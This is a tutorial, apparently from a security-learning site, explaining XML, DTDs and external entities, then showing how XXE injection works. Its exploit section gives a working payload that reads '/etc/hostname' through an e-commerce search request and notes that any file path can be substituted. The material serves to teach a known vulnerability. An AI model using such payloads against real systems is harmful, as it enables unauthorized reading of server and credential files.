# XXE Injection

> **XXE Injection** is a web application security vulnerability which allows malicious attackers to interfere with XML parsing of the web application, typically resulting in the access to the contents of arbitrary files on the system, perform a DOS attack, enumerate internal systems and much more.

XEE Injection arises because of the potential dangerous features that XML parser provides. The features though not needed, might be enabled in the web application, which results in the injection to become successful.

## XML Introduction

XML or _Extensible Markup Language_ is a type of markup language that provides a set of rules for encoding a document that can be read by both humans and machines. The main aspect of XML is to provide ability for inter-communication between machines.

For Example,

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
  </person>
```

The above XML file defines a simple set of data enclosed in opening and closing tags.


### DTD

> Document Type Definition also know as DTD is a set of declarations that define the structure of a XML document.

Example,

```xml
  <?xml version="1.0"?>
  <!DOCTYPE person [
    <!ELEMENT person (firstname, lastname, age)>
    <!ELEMENT firstname (#PCDATA)>
    <!ELEMENT lastname (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
  ]>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
  </person>
```

In the above example,

- `!DOCTYPE person` defines that root element should be `person`.
- `!ELEMENT person` defines that `person` element must have `firstname`, `lastname` and `age` as it's children.
- `!ELEMENT firstname` defines that `firstname` should be of `#PCDATA` type.
- `!ELEMENT lastname` defines that `lastname` should be of `#PCDATA` type.
- `!ELEMENT age` defines that `age` should be of `#PCDATA` type.

Following the above DTD rules we have,

```xml
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

### External DTD

>DTD can be referenced through external files using SYSTEM keyword.

Example,

```xml
<?xml version="1.0"?>
<!DOCTYPE person SYSTEM "person.dtd">
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

The `SYSTEM` keyword is responsible for external references.
Now `person.dtd` will have,

```xml
  <!ELEMENT person (firstname, lastname, age)>
  <!ELEMENT firstname (#PCDATA)>
  <!ELEMENT lastname (#PCDATA)>
  <!ELEMENT age (#PCDATA)>
```

### XML Custom Entities

XML Custom entities enables to reference a user-defined entity in a DTD.

Example,

```xml
  <!DOCTYPE person [
  <!ELEMENT person (#PCDATA) >
  <!ENTITY name "John Doe">
  ]>
  <person>
    &name;
  </person>
```

The `&name;` would then be replace by `John Doe` because it's a custom entity defined in DTD.

## Exploiting XXE Injection

There are numerous XXE attacks but we will mainly focus few of them.

### Reading Arbitrary files using XXE Injection

To be able to read arbitrary files we need to do two things,

1. Insert or modify an external entity that will reference our arbitrary file.
2. Use the defined *external* entity in the XML that gets returned with the application's response along with the contents of the arbitrary file.

Let's say you went to an e-commerce website and you found out that their search functionality uses **XML** in their POST data to send search term to the backend.

POST Request sample,

```post
POST /search/ HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 107
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?><term>Cars</term>
```

To retrieve contents of file at `/etc/hostname` we first define an external entity as,

```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
```

and then, we use the external entity in the XML that will get returned as response to our request.

```xml
  <term>&xxe;</term>
```

Now our full XEE payload will become,

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/hostname'> ]>
  <term>&xxe;</term>
```

Voila! The response we get is,

`No results for "MY_COMPUTER."`

Enclosed between the quotes is our contents of `/etc/hostname`. Just replace `/etc/hostname` with any file name to retrieve it's contents.
